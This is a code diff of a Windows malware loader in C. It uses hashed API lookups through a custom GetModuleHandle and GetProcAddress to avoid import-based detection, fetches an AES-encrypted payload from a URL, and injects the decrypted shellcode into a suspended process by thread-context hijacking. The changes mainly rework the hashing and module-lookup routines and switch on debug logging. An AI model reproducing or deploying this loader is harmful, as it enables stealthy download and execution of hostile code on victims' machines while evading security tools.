@@ -5,13 +5,13 @@
 #include "aes.h"
 #include <winternl.h>
 
-#define HASH_KERNEL32_DLL          0x6A4ABC5B
-#define HASH_CreateProcessA        0xAEB52E19
-#define HASH_VirtualAllocEx        0xF36E5AB4
-#define HASH_WriteProcessMemory    0x6F22E8C8
-#define HASH_VirtualProtectEx      0xD812922A
-#define HASH_GetThreadContext      0xEBA2CFC2
-#define HASH_SetThreadContext      0x7E20964E
+#define HASH_CreateProcessA 0xAEB52E19
+#define HASH_VirtualAllocEx 0xF36E5AB4
+#define HASH_WriteProcessMemory 0x6F22E8C8
+#define HASH_VirtualProtectEx 0xD812922A
+#define HASH_GetThreadContext 0xEBA2CFC2
+#define HASH_SetThreadContext 0x7E20964E
+#define HASH_KERNEL32_DLL 0x6DDB9555
 
 
 
@@ -24,7 +24,7 @@
 
 // set to 1 for error logs
 
-//#define DEBUG
+#define DEBUG
 
 
 // defining the API that we want to import using custom GetModuleHandle and GetProcAddress on runtime
@@ -78,7 +78,7 @@ typedef BOOL (WINAPI* fnSetThreadContext)(
 
 
 
-DWORD HashStringDjb2A(_In_ PWCHAR String)
+DWORD HashStringDjb2A(_In_ LPCSTR String)
 {
 	ULONG Hash = 5381;
 	INT c = 0;
@@ -90,99 +90,44 @@ DWORD HashStringDjb2A(_In_ PWCHAR String)
 }
 
 
-HMODULE GetModuleHandleReplacement(IN DWORD dwDjb2aHash) {
+HMODULE GetModuleHandleCustom(DWORD dwModuleNameHash) {
+
+	if (dwModuleNameHash == NULL)
+		return NULL;
 
 #ifdef _WIN64
-	PPEB					pPeb				= (PEB*)(__readgsqword(0x60));
+	PPEB      pPeb = (PEB*)(__readgsqword(0x60));
 #elif _WIN32
-	PPEB					pPeb				= (PEB*)(__readfsdword(0x30));
+	PPEB      pPeb = (PEB*)(__readfsdword(0x30));
 #endif
 
-	PLDR_DATA_TABLE_ENTRY	pDte				= (PLDR_DATA_TABLE_ENTRY)(pPeb->Ldr->InMemoryOrderModuleList.Flink);
+	PPEB_LDR_DATA            pLdr  = (PPEB_LDR_DATA)(pPeb->Ldr);
+	PLDR_DATA_TABLE_ENTRY	pDte  = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
 
-	// getting the head of the linked list ( used to get the node & to check the end of the list)
-	PLIST_ENTRY				pListHead			= (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
-	// getting the node of the linked list
-	PLIST_ENTRY				pListNode			= (PLIST_ENTRY)pListHead->Flink;
+	while (pDte) {
 
-	do
-	{
-		if (pDte->FullDllName.Length != NULL) {
-			if (HashStringDjb2A(pDte->FullDllName.Buffer) == dwDjb2aHash) {
-#ifdef DEBUG
-			wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);
-#endif
-			// return the found DLL 
-				return (HMODULE)pDte->Reserved2[0];
+		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
+
+			// Converting `FullDllName.Buffer` to upper case string
+			CHAR UpperCaseDllName[MAX_PATH];
+
+			DWORD i = 0;
+			while (pDte->FullDllName.Buffer[i]) {
+				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
+				i++;
 			}
+			UpperCaseDllName[i] = '\0';
 
-#ifdef DEBUG
-			printf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);
-#endif
-			// updating pDte to point to the next PLDR_DATA_TABLE_ENTRY in the linked list
-			pDte = (PLDR_DATA_TABLE_ENTRY)(pListNode->Flink);
-
-			// updating the node variable to be the next node in the linked list
-			pListNode = (PLIST_ENTRY)pListNode->Flink;
+			// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
+			if (HashStringDjb2A(UpperCaseDllName) == dwModuleNameHash)
+				return pDte->Reserved2[0];
 
 		}
-
-	// when the node is equal to the head, we reached the end of the linked list, so we break out of the loop
-	} while (pListNode != pListHead);
-
-
-
-	return NULL;
-}
-
-
-FARPROC GetProcAddressCustom(IN HMODULE hModule, IN DWORD lpApiHash) {
-
-	// We do this to avoid casting at each time we use 'hModule'
-	PBYTE pBase = (PBYTE)hModule;
-
-	// Getting the dos header and doing a signature check
-	PIMAGE_DOS_HEADER	pImgDosHdr		= (PIMAGE_DOS_HEADER)pBase;
-	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
-		return NULL;
-
-	// Getting the nt headers and doing a signature check
-	PIMAGE_NT_HEADERS	pImgNtHdrs		= (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
-	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
-		return NULL;
-
-	// Getting the optional header
-	IMAGE_OPTIONAL_HEADER	ImgOptHdr	= pImgNtHdrs->OptionalHeader;
-
-	// Getting the image export table
-	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
-	// Getting the function's names array pointer
-	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
-
-	// Getting the function's addresses array pointer
-	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
-
-	// Getting the function's ordinal array pointer
-	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
-
-
-	// Looping through all the exported functions
-	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
-
-		// Getting the name of the function
-		WCHAR* pFunctionName = (WCHAR*)(pBase + FunctionNameArray[i]);
-
-		// Getting the address of the function through its ordinal
-		PVOID pFunctionAddress	= (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
-
-		// Searching for the function specified
-		if (HashStringDjb2A(pFunctionName) == lpApiHash){
-			#ifdef DEBUG
-			printf("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
-			#endif
-			return pFunctionAddress;
+		else {
+			break;
 		}
+
+		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
 	}
 
 	return NULL;
@@ -190,6 +135,43 @@ FARPROC GetProcAddressCustom(IN HMODULE hModule, IN DWORD lpApiHash) {
 
 
 
+FARPROC GetProcAddressCustom(HMODULE hModule, DWORD dwApiNameHash) {
+
+	if (hModule == NULL || dwApiNameHash == NULL)
+		return NULL;
+
+	PBYTE pBase = (PBYTE)hModule;
+
+	PIMAGE_DOS_HEADER         pImgDosHdr			  = (PIMAGE_DOS_HEADER)pBase;
+	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
+		return NULL;
+
+	PIMAGE_NT_HEADERS         pImgNtHdrs			  = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+		return NULL;
+
+	IMAGE_OPTIONAL_HEADER     ImgOptHdr			  = pImgNtHdrs->OptionalHeader;
+
+	PIMAGE_EXPORT_DIRECTORY   pImgExportDir		  = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+
+	PDWORD  FunctionNameArray	= (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+	PDWORD  FunctionAddressArray	= (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+	PWORD   FunctionOrdinalArray	= (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+
+	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
+		CHAR*	pFunctionName       = (CHAR*)(pBase + FunctionNameArray[i]);
+		PVOID	pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+
+		// Hashing every function name pFunctionName
+		// If both hashes are equal then we found the function we want
+		if (dwApiNameHash == HashStringDjb2A(pFunctionName)) {
+			return pFunctionAddress;
+		}
+	}
+
+	return NULL;
+}
 
 BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
 
@@ -315,7 +297,7 @@ BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE 
 
 BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread ) {
 
-    fnCreateProcessA pCreateProcessA = GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_CreateProcessA);
+    fnCreateProcessA pCreateProcessA = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_CreateProcessA);
 
     CHAR lpPath [MAX_PATH * 2];
     CHAR WinDirectory [MAX_PATH];
@@ -391,11 +373,11 @@ BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT
 
 BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pShellcodeAddress) {
 
-    fnVirtualAllocEx pVirtualAllocEx = GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_VirtualAllocEx);
+    fnVirtualAllocEx pVirtualAllocEx = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_VirtualAllocEx);
 
-    fnWriteProcessMemory pWriteProcessMemory = GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_WriteProcessMemory);
+    fnWriteProcessMemory pWriteProcessMemory = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_WriteProcessMemory);
 
-    fnVirtualProtectEx pVirtualProtectEx = GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_VirtualProtectEx);
+    fnVirtualProtectEx pVirtualProtectEx = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_VirtualProtectEx);
 
     SIZE_T lpNumberOfBytesWritten = 0;
     DWORD dwOldProtection = 0;
@@ -432,10 +414,10 @@ BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN 
 BOOL HijackThreadExecution(HANDLE hThread, IN PVOID pAddress) {
 
     fnGetThreadContext pGetThreadContext =
-        GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_GetThreadContext);
+        GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_GetThreadContext);
 
     fnSetThreadContext pSetThreadContext =
-        GetProcAddressCustom(GetModuleHandleReplacement(HASH_KERNEL32_DLL), HASH_SetThreadContext);
+        GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_SetThreadContext);
 
     CONTEXT ThreadContext = {
         .ContextFlags =  CONTEXT_CONTROL
@@ -472,6 +454,11 @@ int main(int argc, char* argv[]) {
     PVOID pShellcodeAddress = NULL;
 
     // 1: Get encrypted payload
+
+    if (LoadLibraryA("KERNEL32.DLL") == NULL) {
+		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
+		return 0;
+	}
 
     if (!GetPayload(PAYLOAD, &pEncrypted, &sSizeOfPayload)) {
         #ifdef DEBUG
